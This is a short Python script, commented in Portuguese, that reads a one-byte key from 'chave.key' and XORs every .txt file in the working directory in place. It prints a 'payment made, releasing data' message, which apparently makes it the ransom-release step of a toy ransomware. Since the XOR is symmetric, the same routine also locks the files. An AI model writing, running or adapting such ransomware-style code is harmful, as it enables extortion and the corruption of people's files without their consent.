import os

def ler_chave():
    with open("chave.key", "rb") as f:
        return ord(f.read())

def xor_arquivo(caminho, chave):
    with open(caminho, 'rb') as f:
        dados = bytearray(f.read())

    for i in range(len(dados)):
        dados[i] ^= chave

    with open(caminho, 'wb') as f:
        f.write(dados)

# --- Início ---
pasta = os.getcwd()
chave = ler_chave()

print(f"Lendo a chave: {chave}")

for nome in os.listdir(pasta):
    if nome.endswith(".txt") and nome != "chave.key":
        caminho = os.path.join(pasta, nome)
        xor_arquivo(caminho, chave)
        print(f"Pagamento realizando liberando dados!: {nome}")
